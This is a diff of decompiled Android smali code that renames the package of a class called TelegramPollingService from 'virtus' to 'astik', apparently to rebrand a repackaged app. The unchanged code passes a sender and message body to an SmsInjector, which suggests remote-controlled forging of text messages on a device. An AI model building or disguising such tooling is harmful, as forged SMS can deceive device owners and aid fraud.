@@ -1,4 +1,4 @@
-.class Lcom/virtus/module/TelegramPollingService$4;
+.class Lcom/astik/module/TelegramPollingService$4;
 .super Ljava/lang/Object;
 .source "TelegramPollingService.java"
 
@@ -8,7 +8,7 @@
 
 # annotations
 .annotation system Ldalvik/annotation/EnclosingMethod;
-    value = Lcom/virtus/module/TelegramPollingService;->retryLater(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
+    value = Lcom/astik/module/TelegramPollingService;->retryLater(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
 .end annotation
 
 .annotation system Ldalvik/annotation/InnerClass;
@@ -18,7 +18,7 @@
 
 
 # instance fields
-.field final synthetic this$0:Lcom/virtus/module/TelegramPollingService;
+.field final synthetic this$0:Lcom/astik/module/TelegramPollingService;
 
 .field final synthetic val$body:Ljava/lang/String;
 
@@ -28,7 +28,7 @@
 
 
 # direct methods
-.method constructor <init>(Lcom/virtus/module/TelegramPollingService;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
+.method constructor <init>(Lcom/astik/module/TelegramPollingService;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
     .locals 0
     .annotation system Ldalvik/annotation/MethodParameters;
         accessFlags = {
@@ -52,13 +52,13 @@
     .end annotation
 
     .line 392
-    iput-object p1, p0, Lcom/virtus/module/TelegramPollingService$4;->this$0:Lcom/virtus/module/TelegramPollingService;
+    iput-object p1, p0, Lcom/astik/module/TelegramPollingService$4;->this$0:Lcom/astik/module/TelegramPollingService;
 
-    iput-object p2, p0, Lcom/virtus/module/TelegramPollingService$4;->val$sender:Ljava/lang/String;
+    iput-object p2, p0, Lcom/astik/module/TelegramPollingService$4;->val$sender:Ljava/lang/String;
 
-    iput-object p3, p0, Lcom/virtus/module/TelegramPollingService$4;->val$body:Ljava/lang/String;
+    iput-object p3, p0, Lcom/astik/module/TelegramPollingService$4;->val$body:Ljava/lang/String;
 
-    iput-object p4, p0, Lcom/virtus/module/TelegramPollingService$4;->val$childId:Ljava/lang/String;
+    iput-object p4, p0, Lcom/astik/module/TelegramPollingService$4;->val$childId:Ljava/lang/String;
 
     invoke-direct {p0}, Ljava/lang/Object;-><init>()V
 
@@ -79,9 +79,9 @@
     .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0
 
     .line 396
-    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService$4;->this$0:Lcom/virtus/module/TelegramPollingService;
+    iget-object v0, p0, Lcom/astik/module/TelegramPollingService$4;->this$0:Lcom/astik/module/TelegramPollingService;
 
-    invoke-static {v0}, Lcom/virtus/module/TelegramPollingService;->access$000(Lcom/virtus/module/TelegramPollingService;)Z
+    invoke-static {v0}, Lcom/astik/module/TelegramPollingService;->access$000(Lcom/astik/module/TelegramPollingService;)Z
 
     move-result v0
 
@@ -91,27 +91,27 @@
 
     .line 397
     :cond_0
-    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService$4;->this$0:Lcom/virtus/module/TelegramPollingService;
+    iget-object v0, p0, Lcom/astik/module/TelegramPollingService$4;->this$0:Lcom/astik/module/TelegramPollingService;
 
-    iget-object v1, p0, Lcom/virtus/module/TelegramPollingService$4;->val$sender:Ljava/lang/String;
+    iget-object v1, p0, Lcom/astik/module/TelegramPollingService$4;->val$sender:Ljava/lang/String;
 
-    iget-object v2, p0, Lcom/virtus/module/TelegramPollingService$4;->val$body:Ljava/lang/String;
+    iget-object v2, p0, Lcom/astik/module/TelegramPollingService$4;->val$body:Ljava/lang/String;
 
-    invoke-static {v0, v1, v2}, Lcom/virtus/module/SmsInjector;->inject(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z
+    invoke-static {v0, v1, v2}, Lcom/astik/module/SmsInjector;->inject(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z
 
     move-result v0
 
     .line 398
-    const-string v1, "VirtusModule"
+    const-string v1, "AstikModule"
 
     if-eqz v0, :cond_1
 
     .line 399
-    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService$4;->this$0:Lcom/virtus/module/TelegramPollingService;
+    iget-object v0, p0, Lcom/astik/module/TelegramPollingService$4;->this$0:Lcom/astik/module/TelegramPollingService;
 
-    iget-object v2, p0, Lcom/virtus/module/TelegramPollingService$4;->val$childId:Ljava/lang/String;
+    iget-object v2, p0, Lcom/astik/module/TelegramPollingService$4;->val$childId:Ljava/lang/String;
 
-    invoke-static {v0, v2}, Lcom/virtus/module/TelegramPollingService;->access$600(Lcom/virtus/module/TelegramPollingService;Ljava/lang/String;)V
+    invoke-static {v0, v2}, Lcom/astik/module/TelegramPollingService;->access$600(Lcom/astik/module/TelegramPollingService;Ljava/lang/String;)V
 
     .line 400
     new-instance v0, Ljava/lang/StringBuilder;
@@ -120,7 +120,7 @@
 
     invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
 
-    iget-object v2, p0, Lcom/virtus/module/TelegramPollingService$4;->val$sender:Ljava/lang/String;
+    iget-object v2, p0, Lcom/astik/module/TelegramPollingService$4;->val$sender:Ljava/lang/String;
 
     invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
@@ -140,7 +140,7 @@
 
     invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
 
-    iget-object v2, p0, Lcom/virtus/module/TelegramPollingService$4;->val$sender:Ljava/lang/String;
+    iget-object v2, p0, Lcom/astik/module/TelegramPollingService$4;->val$sender:Ljava/lang/String;
 
     invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
 
